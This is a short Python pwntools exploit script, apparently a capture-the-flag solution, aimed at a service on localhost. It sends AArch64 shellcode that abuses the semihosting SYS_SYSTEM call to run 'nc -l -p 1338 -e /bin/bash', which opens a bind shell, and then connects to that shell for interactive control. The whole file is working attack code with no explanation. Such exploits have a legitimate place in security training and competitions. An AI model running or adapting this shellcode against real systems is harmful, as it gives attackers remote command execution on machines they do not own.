#!/usr/bin/env python3
# coding: utf8
from pwn import *
import time

context.arch = 'aarch64'

r = remote("127.0.0.1", 1337)

assembly = """
add sp, sp, 0x20
mov x0, 0x12 /* TARGET_SYS_SYSTEM */
adr x1, cmd
str x1, [sp]
mov x1, #0x100
str x1, [sp,8]
mov x1, sp
hlt #0xf000
sub sp, sp, 0x20
ret

cmd:
        .asciz "nc -l -p 1338 -e /bin/bash"
"""


print(assembly)
shellcode = asm(assembly)
r.send(shellcode)
time.sleep(1)
r = remote("127.0.0.1", 1338)
r.interactive()
